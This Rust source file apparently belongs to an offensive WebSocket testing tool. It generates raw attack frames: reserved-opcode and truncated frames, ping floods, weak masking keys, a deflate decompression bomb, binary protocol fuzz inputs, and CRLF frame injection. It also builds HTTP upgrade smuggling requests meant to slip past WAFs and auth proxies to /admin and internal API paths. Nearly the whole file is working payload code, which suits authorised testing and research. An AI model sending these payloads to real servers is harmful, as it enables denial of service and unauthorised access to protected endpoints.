use serde::{Deserialize, Serialize};

/// WebSocket opcodes per RFC 6455 §5.2.
const OPCODE_CONTINUATION: u8 = 0x0;
const OPCODE_TEXT: u8 = 0x1;
const OPCODE_BINARY: u8 = 0x2;
const OPCODE_CLOSE: u8 = 0x8;
const OPCODE_PING: u8 = 0x9;
const OPCODE_PONG: u8 = 0xA;

/// Reserved opcodes that must trigger protocol errors on compliant servers.
const RESERVED_OPCODES: [u8; 5] = [0x3, 0x4, 0x5, 0x6, 0x7];

/// Maximum payload for control frames per RFC 6455 §5.5 (125 bytes).
const CONTROL_FRAME_MAX_PAYLOAD: usize = 125;

/// FIN bit position in the first byte of a WebSocket frame.
const FIN_BIT: u8 = 0x80;

/// RSV bits (reserved for extensions) in the first byte.
const RSV1_BIT: u8 = 0x40;
const RSV2_BIT: u8 = 0x20;
const RSV3_BIT: u8 = 0x10;

/// Mask bit in the second byte of a WebSocket frame.
const MASK_BIT: u8 = 0x80;

/// Categories of WebSocket frame-level attacks.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum WsFrameAttackType {
    MalformedFrame,
    ControlFrameAbuse,
    MaskingAttack,
    ExtensionAbuse,
    BinaryProtocolFuzz,
    FrameInjection,
    UpgradeSmuggling,
}

impl std::fmt::Display for WsFrameAttackType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::MalformedFrame => write!(f, "Malformed WebSocket Frame"),
            Self::ControlFrameAbuse => write!(f, "Control Frame Abuse"),
            Self::MaskingAttack => write!(f, "Masking Key Attack"),
            Self::ExtensionAbuse => write!(f, "Extension Negotiation Abuse"),
            Self::BinaryProtocolFuzz => write!(f, "Binary Protocol Fuzzing"),
            Self::FrameInjection => write!(f, "WebSocket Frame Injection"),
            Self::UpgradeSmuggling => write!(f, "Upgrade Smuggling"),
        }
    }
}

/// Configuration for WebSocket binary fuzzing attack generation.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WsBinaryFuzzConfig {
    pub frame_count: u32,
    pub max_payload_size: usize,
    pub use_masking: bool,
    pub masking_key: [u8; 4],
}

impl Default for WsBinaryFuzzConfig {
    fn default() -> Self {
        Self {
            frame_count: 100,
            max_payload_size: 65536,
            use_masking: true,
            masking_key: [0x37, 0xFA, 0x21, 0x3D],
        }
    }
}

impl WsBinaryFuzzConfig {
    pub fn with_frame_count(mut self, count: u32) -> Self {
        self.frame_count = count;
        self
    }

    pub fn with_max_payload_size(mut self, size: usize) -> Self {
        self.max_payload_size = size;
        self
    }

    pub fn with_masking(mut self, enabled: bool) -> Self {
        self.use_masking = enabled;
        self
    }

    pub fn with_masking_key(mut self, key: [u8; 4]) -> Self {
        self.masking_key = key;
        self
    }
}

/// A generated WebSocket attack payload with raw frame bytes and metadata.
#[derive(Debug, Clone)]
pub struct WsAttackPayload {
    pub attack_type: WsFrameAttackType,
    pub frames: Vec<Vec<u8>>,
    pub total_bytes: usize,
    pub description: String,
}

impl WsAttackPayload {
    /// Validate that each frame has at least the minimum 2-byte header.
    pub fn validate_frame_headers(&self) -> bool {
        self.frames.iter().all(|f| f.len() >= 2)
    }
}

/// Encode a raw WebSocket frame from components.
///
/// Follows RFC 6455 §5.2 wire format:
/// - byte 0: FIN | RSV1-3 | opcode
/// - byte 1: MASK | payload length (7-bit, 16-bit, or 64-bit extended)
/// - bytes 2-5 (if masked): masking key
/// - remaining: payload data (XOR-masked if MASK bit set)
fn encode_ws_frame(
    fin: bool,
    rsv: u8,
    opcode: u8,
    mask_key: Option<[u8; 4]>,
    payload: &[u8],
) -> Vec<u8> {
    let mut frame = Vec::new();

    let byte0 = (if fin { FIN_BIT } else { 0 }) | (rsv & 0x70) | (opcode & 0x0F);
    frame.push(byte0);

    let masked = mask_key.is_some();
    let mask_flag = if masked { MASK_BIT } else { 0 };
    let len = payload.len();

    if len <= 125 {
        frame.push(mask_flag | (len as u8));
    } else if len <= 65535 {
        frame.push(mask_flag | 126);
        frame.extend_from_slice(&(len as u16).to_be_bytes());
    } else {
        frame.push(mask_flag | 127);
        frame.extend_from_slice(&(len as u64).to_be_bytes());
    }

    if let Some(key) = mask_key {
        frame.extend_from_slice(&key);
        let masked_payload: Vec<u8> = payload
            .iter()
            .enumerate()
            .map(|(i, b)| b ^ key[i % 4])
            .collect();
        frame.extend_from_slice(&masked_payload);
    } else {
        frame.extend_from_slice(payload);
    }

    frame
}

/// Parse the opcode from a raw WebSocket frame.
pub fn parse_ws_opcode(frame: &[u8]) -> Option<u8> {
    if frame.len() < 2 {
        return None;
    }
    Some(frame[0] & 0x0F)
}

/// Parse whether FIN bit is set in a raw WebSocket frame.
pub fn parse_ws_fin(frame: &[u8]) -> Option<bool> {
    if frame.len() < 2 {
        return None;
    }
    Some(frame[0] & FIN_BIT != 0)
}

/// Parse RSV bits from a raw WebSocket frame (returns bits in positions 4-6).
pub fn parse_ws_rsv(frame: &[u8]) -> Option<u8> {
    if frame.len() < 2 {
        return None;
    }
    Some(frame[0] & 0x70)
}

/// Parse whether the MASK bit is set in a raw WebSocket frame.
pub fn parse_ws_masked(frame: &[u8]) -> Option<bool> {
    if frame.len() < 2 {
        return None;
    }
    Some(frame[1] & MASK_BIT != 0)
}

/// Parse payload length from a raw WebSocket frame header.
pub fn parse_ws_payload_length(frame: &[u8]) -> Option<u64> {
    if frame.len() < 2 {
        return None;
    }
    let len_byte = frame[1] & 0x7F;
    match len_byte {
        0..=125 => Some(len_byte as u64),
        126 => {
            if frame.len() < 4 {
                return None;
            }
            let len = u16::from_be_bytes([frame[2], frame[3]]);
            Some(len as u64)
        }
        127 => {
            if frame.len() < 10 {
                return None;
            }
            let len = u64::from_be_bytes([
                frame[2], frame[3], frame[4], frame[5], frame[6], frame[7], frame[8], frame[9],
            ]);
            Some(len)
        }
        _ => None,
    }
}

/// Generate malformed WebSocket frames with invalid opcodes, oversized payloads,
/// and broken continuation sequences.
pub fn generate_malformed_frames(config: &WsBinaryFuzzConfig) -> WsAttackPayload {
    let mut frames = Vec::new();
    let mask = if config.use_masking {
        Some(config.masking_key)
    } else {
        None
    };

    for &opcode in &RESERVED_OPCODES {
        frames.push(encode_ws_frame(
            true,
            0,
            opcode,
            mask,
            b"reserved-opcode-test",
        ));
    }

    let huge_payload = vec![0x41; config.max_payload_size];
    frames.push(encode_ws_frame(true, 0, OPCODE_TEXT, mask, &huge_payload));

    frames.push(encode_ws_frame(
        false,
        0,
        OPCODE_TEXT,
        mask,
        b"fragment-start",
    ));
    frames.push(encode_ws_frame(
        true,
        0,
        OPCODE_TEXT,
        mask,
        b"wrong-opcode-continuation",
    ));

    frames.push(encode_ws_frame(
        true,
        0,
        OPCODE_CONTINUATION,
        mask,
        b"orphan-continuation",
    ));

    let mut truncated = encode_ws_frame(true, 0, OPCODE_TEXT, mask, b"truncated");
    if truncated.len() > 4 {
        truncated.truncate(4);
    }
    frames.push(truncated);

    frames.push(encode_ws_frame(true, 0, 0x0F, mask, b"max-invalid-opcode"));

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    WsAttackPayload {
        attack_type: WsFrameAttackType::MalformedFrame,
        frames,
        total_bytes,
        description: format!(
            "Malformed frames: {} reserved opcodes + oversized payload + broken continuation + \
             orphan continuation + truncated frame + max invalid opcode",
            RESERVED_OPCODES.len()
        ),
    }
}

/// Generate control frame abuse attacks: oversized close frames, ping/pong
/// flooding, and reserved-bit control frames.
pub fn generate_control_frame_abuse(config: &WsBinaryFuzzConfig) -> WsAttackPayload {
    let mut frames = Vec::new();
    let mask = if config.use_masking {
        Some(config.masking_key)
    } else {
        None
    };

    let oversized_close_body = vec![0x03, 0xE8];
    let mut close_payload = oversized_close_body;
    close_payload.extend(vec![0x41; CONTROL_FRAME_MAX_PAYLOAD + 50]);
    frames.push(encode_ws_frame(true, 0, OPCODE_CLOSE, mask, &close_payload));

    let ping_count = config.frame_count.min(200);
    for i in 0..ping_count {
        let ping_data = format!("ping-{i:04}");
        frames.push(encode_ws_frame(
            true,
            0,
            OPCODE_PING,
            mask,
            ping_data.as_bytes(),
        ));
    }

    frames.push(encode_ws_frame(
        true,
        0,
        OPCODE_PONG,
        mask,
        b"unsolicited-pong",
    ));

    frames.push(encode_ws_frame(
        false,
        0,
        OPCODE_PING,
        mask,
        b"fragmented-ping",
    ));

    frames.push(encode_ws_frame(true, 0, OPCODE_CLOSE, mask, &[0xFF, 0xFF]));

    frames.push(encode_ws_frame(true, 0, OPCODE_CLOSE, mask, &[]));

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    WsAttackPayload {
        attack_type: WsFrameAttackType::ControlFrameAbuse,
        frames,
        total_bytes,
        description: format!(
            "Control frame abuse: oversized close + {} pings + unsolicited pong + \
             fragmented ping + invalid close code + empty close",
            ping_count
        ),
    }
}

/// Generate masking key attacks: unmasked client frames and predictable
/// masking keys that reveal payload patterns.
pub fn generate_masking_attacks(config: &WsBinaryFuzzConfig) -> WsAttackPayload {
    let mut frames = Vec::new();
    let test_payload = b"sensitive-data-unmasked";

    frames.push(encode_ws_frame(true, 0, OPCODE_TEXT, None, test_payload));

    frames.push(encode_ws_frame(true, 0, OPCODE_BINARY, None, test_payload));

    let zero_key = [0x00, 0x00, 0x00, 0x00];
    frames.push(encode_ws_frame(
        true,
        0,
        OPCODE_TEXT,
        Some(zero_key),
        test_payload,
    ));

    let repeated_key = [0xAA, 0xAA, 0xAA, 0xAA];
    frames.push(encode_ws_frame(
        true,
        0,
        OPCODE_TEXT,
        Some(repeated_key),
        test_payload,
    ));

    let sequential_key = [0x01, 0x02, 0x03, 0x04];
    frames.push(encode_ws_frame(
        true,
        0,
        OPCODE_TEXT,
        Some(sequential_key),
        test_payload,
    ));

    let count = config.frame_count.min(50);
    let same_key = config.masking_key;
    for _ in 0..count {
        frames.push(encode_ws_frame(
            true,
            0,
            OPCODE_TEXT,
            Some(same_key),
            test_payload,
        ));
    }

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    WsAttackPayload {
        attack_type: WsFrameAttackType::MaskingAttack,
        frames,
        total_bytes,
        description: format!(
            "Masking attacks: 2 unmasked + zero key + repeated key + sequential key + \
             {} reused key frames",
            count
        ),
    }
}

/// Generate extension negotiation abuse frames exploiting permessage-deflate.
///
/// Sends compressed payloads that expand dramatically on decompression (compression bombs)
/// and frames with RSV bits set without negotiated extensions.
pub fn generate_extension_abuse(config: &WsBinaryFuzzConfig) -> WsAttackPayload {
    let mut frames = Vec::new();
    let mask = if config.use_masking {
        Some(config.masking_key)
    } else {
        None
    };

    let deflate_bomb = build_deflate_bomb(config.max_payload_size.min(4096));
    frames.push(encode_ws_frame(
        true,
        RSV1_BIT,
        OPCODE_BINARY,
        mask,
        &deflate_bomb,
    ));

    frames.push(encode_ws_frame(
        true,
        RSV1_BIT,
        OPCODE_TEXT,
        mask,
        b"rsv1-without-extension",
    ));
    frames.push(encode_ws_frame(
        true,
        RSV2_BIT,
        OPCODE_TEXT,
        mask,
        b"rsv2-without-extension",
    ));
    frames.push(encode_ws_frame(
        true,
        RSV3_BIT,
        OPCODE_TEXT,
        mask,
        b"rsv3-without-extension",
    ));
    frames.push(encode_ws_frame(
        true,
        RSV1_BIT | RSV2_BIT | RSV3_BIT,
        OPCODE_TEXT,
        mask,
        b"all-rsv-bits-set",
    ));

    frames.push(encode_ws_frame(
        true,
        RSV1_BIT,
        OPCODE_BINARY,
        mask,
        &[0x00],
    ));

    frames.push(encode_ws_frame(
        true,
        RSV1_BIT,
        OPCODE_BINARY,
        mask,
        &[0x78, 0x9C, 0x00, 0x00, 0x00, 0xFF, 0xFF],
    ));

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    WsAttackPayload {
        attack_type: WsFrameAttackType::ExtensionAbuse,
        frames,
        total_bytes,
        description: "Extension abuse: deflate bomb + RSV1/RSV2/RSV3/all-RSV frames + \
                       truncated deflate + malformed zlib header"
            .to_string(),
    }
}

/// Build a synthetic deflate-compressed payload that expands dramatically.
///
/// Uses raw DEFLATE blocks with repeated zero bytes that compress well
/// but expand to `target_expanded_size` on decompression.
fn build_deflate_bomb(target_expanded_size: usize) -> Vec<u8> {
    let mut payload = Vec::new();
    let chunk_size: u16 = if target_expanded_size >= u16::MAX as usize {
        u16::MAX
    } else {
        target_expanded_size as u16
    };
    let zeros = vec![0u8; chunk_size as usize];

    payload.push(0x00);
    payload.extend_from_slice(&chunk_size.to_le_bytes());
    let nlen = !chunk_size;
    payload.extend_from_slice(&nlen.to_le_bytes());
    payload.extend_from_slice(&zeros);

    payload
}

/// Generate binary protocol fuzzing payloads for WASM/gRPC-Web/custom
/// protocols transmitted over WebSocket binary frames.
pub fn generate_binary_protocol_fuzz(config: &WsBinaryFuzzConfig) -> WsAttackPayload {
    let mut frames = Vec::new();
    let mask = if config.use_masking {
        Some(config.masking_key)
    } else {
        None
    };

    let grpc_prefix = [0x00, 0x00, 0x00, 0x00, 0x05];
    let mut grpc_payload = grpc_prefix.to_vec();
    grpc_payload.extend_from_slice(b"\x0A\x03\x41\x41\x41");
    frames.push(encode_ws_frame(true, 0, OPCODE_BINARY, mask, &grpc_payload));

    let mut grpc_overflow = vec![0x00];
    grpc_overflow.extend_from_slice(&(0xFFFFFFFFu32).to_be_bytes());
    grpc_overflow.extend_from_slice(b"short");
    frames.push(encode_ws_frame(
        true,
        0,
        OPCODE_BINARY,
        mask,
        &grpc_overflow,
    ));

    let protobuf_varint_overflow = vec![0x80; 12];
    frames.push(encode_ws_frame(
        true,
        0,
        OPCODE_BINARY,
        mask,
        &protobuf_varint_overflow,
    ));

    let mut wasm_magic = b"\x00asm".to_vec();
    wasm_magic.extend_from_slice(&[0x01, 0x00, 0x00, 0x00]);
    wasm_magic.extend_from_slice(&[0xFF; 64]);
    frames.push(encode_ws_frame(true, 0, OPCODE_BINARY, mask, &wasm_magic));

    let msgpack_payloads: Vec<Vec<u8>> = vec![
        vec![0xC0],
        vec![0xC3],
        vec![0xDB, 0xFF, 0xFF, 0xFF, 0xFF],
        vec![0xDD, 0xFF, 0xFF, 0xFF, 0xFF],
    ];
    for mp in &msgpack_payloads {
        frames.push(encode_ws_frame(true, 0, OPCODE_BINARY, mask, mp));
    }

    let null_embedded = b"normal\x00hidden\x00data";
    frames.push(encode_ws_frame(true, 0, OPCODE_BINARY, mask, null_embedded));

    let boundary_sizes: [usize; 3] = [0, 1, config.max_payload_size.min(65535)];
    for size in boundary_sizes {
        let payload = vec![0xDE; size];
        frames.push(encode_ws_frame(true, 0, OPCODE_BINARY, mask, &payload));
    }

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    WsAttackPayload {
        attack_type: WsFrameAttackType::BinaryProtocolFuzz,
        frames,
        total_bytes,
        description: "Binary protocol fuzz: gRPC-Web + protobuf varint overflow + WASM header + \
                       msgpack edge cases + null bytes + boundary sizes"
            .to_string(),
    }
}

/// Generate frame injection payloads that attempt to inject WebSocket frames
/// through intermediary proxies via HTTP response splitting or content-length
/// mismatches.
pub fn generate_frame_injection(config: &WsBinaryFuzzConfig) -> WsAttackPayload {
    let mut frames = Vec::new();
    let mask = if config.use_masking {
        Some(config.masking_key)
    } else {
        None
    };

    let injected_text = encode_ws_frame(true, 0, OPCODE_TEXT, None, b"injected-via-proxy");
    let mut carrier = b"legitimate-payload\r\n\r\n".to_vec();
    carrier.extend_from_slice(&injected_text);
    frames.push(encode_ws_frame(true, 0, OPCODE_TEXT, mask, &carrier));

    let double_frame = {
        let inner1 = encode_ws_frame(true, 0, OPCODE_TEXT, mask, b"first-frame");
        let inner2 = encode_ws_frame(true, 0, OPCODE_TEXT, mask, b"second-frame");
        let mut combined = inner1;
        combined.extend_from_slice(&inner2);
        combined
    };
    frames.push(double_frame);

    let crlf_payload =
        b"data\r\nContent-Length: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n";
    frames.push(encode_ws_frame(true, 0, OPCODE_TEXT, mask, crlf_payload));

    let mut interleaved = Vec::new();
    for i in 0..config.frame_count.min(20) {
        let payload = format!("interleaved-{i:04}");
        let opcode = if i % 2 == 0 {
            OPCODE_TEXT
        } else {
            OPCODE_BINARY
        };
        interleaved.push(encode_ws_frame(true, 0, opcode, mask, payload.as_bytes()));
    }
    frames.extend(interleaved);

    let utf8_invalid = vec![0xFF, 0xFE, 0x80, 0xC0, 0xC1];
    frames.push(encode_ws_frame(true, 0, OPCODE_TEXT, mask, &utf8_invalid));

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    WsAttackPayload {
        attack_type: WsFrameAttackType::FrameInjection,
        frames,
        total_bytes,
        description: format!(
            "Frame injection: CRLF smuggling + concatenated frames + response splitting + \
             {} interleaved frames + invalid UTF-8 in text",
            config.frame_count.min(20)
        ),
    }
}

/// Generate HTTP upgrade smuggling payloads that exploit the WebSocket
/// handshake to bypass HTTP middleware (WAFs, auth proxies, load balancers).
pub fn generate_upgrade_smuggling(_config: &WsBinaryFuzzConfig) -> WsAttackPayload {
    let mut frames = Vec::new();

    let smuggle_requests: Vec<String> = vec![
        "GET / HTTP/1.1\r\nHost: localhost\r\nUpgrade: websocket\r\n\
         Connection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
         Sec-WebSocket-Version: 13\r\n\r\n\
         GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
            .to_string(),
        "GET / HTTP/1.1\r\nHost: localhost\r\nUpgrade: websocket\r\n\
         Connection: keep-alive, Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
         Sec-WebSocket-Version: 13\r\nContent-Length: 0\r\n\
         Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n\
         POST /api/internal HTTP/1.1\r\nHost: localhost\r\n\r\n"
            .to_string(),
        "GET / HTTP/1.1\r\nHost: localhost\r\nUpgrade: h2c\r\n\
         Connection: Upgrade, HTTP2-Settings\r\n\
         HTTP2-Settings: AAMAAABkAAQBAAAAAAIAAAAA\r\n\r\n"
            .to_string(),
        "GET / HTTP/1.1\r\nHost: localhost\r\n\
         Upgrade: websocket\r\nConnection: Upgrade\r\n\
         Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
         Sec-WebSocket-Version: 7, 8, 13\r\n\
         Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits=8\r\n\
         Origin: http://evil.example.com\r\n\r\n"
            .to_string(),
        "GET / HTTP/1.1\r\nHost: localhost\r\nUpgrade: WebSocket\r\n\
         Connection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\
         Sec-WebSocket-Version: 13\r\n\
         X-Forwarded-For: 127.0.0.1\r\n\
         X-Real-IP: 127.0.0.1\r\n\
         X-Original-URL: /admin\r\n\r\n"
            .to_string(),
    ];

    for req in &smuggle_requests {
        frames.push(req.as_bytes().to_vec());
    }

    let total_bytes = frames.iter().map(|f| f.len()).sum();
    WsAttackPayload {
        attack_type: WsFrameAttackType::UpgradeSmuggling,
        frames,
        total_bytes,
        description: format!(
            "Upgrade smuggling: {} handshake variants (request splitting, CL/TE, \
             h2c upgrade, version downgrade, header injection)",
            smuggle_requests.len()
        ),
    }
}

/// Generate attack payloads for all seven WebSocket frame-level attack types.
pub fn generate_all_ws_attacks(config: &WsBinaryFuzzConfig) -> Vec<WsAttackPayload> {
    vec![
        generate_malformed_frames(config),
        generate_control_frame_abuse(config),
        generate_masking_attacks(config),
        generate_extension_abuse(config),
        generate_binary_protocol_fuzz(config),
        generate_frame_injection(config),
        generate_upgrade_smuggling(config),
    ]
}

/// Generate a single attack type with the given configuration.
pub fn generate_ws_attack(
    attack_type: WsFrameAttackType,
    config: &WsBinaryFuzzConfig,
) -> WsAttackPayload {
    match attack_type {
        WsFrameAttackType::MalformedFrame => generate_malformed_frames(config),
        WsFrameAttackType::ControlFrameAbuse => generate_control_frame_abuse(config),
        WsFrameAttackType::MaskingAttack => generate_masking_attacks(config),
        WsFrameAttackType::ExtensionAbuse => generate_extension_abuse(config),
        WsFrameAttackType::BinaryProtocolFuzz => generate_binary_protocol_fuzz(config),
        WsFrameAttackType::FrameInjection => generate_frame_injection(config),
        WsFrameAttackType::UpgradeSmuggling => generate_upgrade_smuggling(config),
    }
}

/// Returns all known WebSocket frame-level attack types.
pub fn all_ws_attack_types() -> Vec<WsFrameAttackType> {
    vec![
        WsFrameAttackType::MalformedFrame,
        WsFrameAttackType::ControlFrameAbuse,
        WsFrameAttackType::MaskingAttack,
        WsFrameAttackType::ExtensionAbuse,
        WsFrameAttackType::BinaryProtocolFuzz,
        WsFrameAttackType::FrameInjection,
        WsFrameAttackType::UpgradeSmuggling,
    ]
}

/// Returns WebSocket upgrade handshake headers for negotiating extensions.
///
/// Useful for building probe requests that test server extension handling.
pub fn ws_upgrade_headers_with_extensions(extensions: &[&str]) -> Vec<(String, String)> {
    let mut headers = vec![
        ("Upgrade".to_string(), "websocket".to_string()),
        ("Connection".to_string(), "Upgrade".to_string()),
        (
            "Sec-WebSocket-Key".to_string(),
            "dGhlIHNhbXBsZSBub25jZQ==".to_string(),
        ),
        ("Sec-WebSocket-Version".to_string(), "13".to_string()),
    ];
    if !extensions.is_empty() {
        headers.push((
            "Sec-WebSocket-Extensions".to_string(),
            extensions.join(", "),
        ));
    }
    headers
}

/// Score a WebSocket frame attack type by severity and likelihood of impact.
pub fn score_ws_attack(attack_type: &WsFrameAttackType) -> f64 {
    match attack_type {
        WsFrameAttackType::UpgradeSmuggling => 0.95,
        WsFrameAttackType::FrameInjection => 0.90,
        WsFrameAttackType::ExtensionAbuse => 0.85,
        WsFrameAttackType::MaskingAttack => 0.75,
        WsFrameAttackType::MalformedFrame => 0.70,
        WsFrameAttackType::ControlFrameAbuse => 0.65,
        WsFrameAttackType::BinaryProtocolFuzz => 0.60,
    }
}
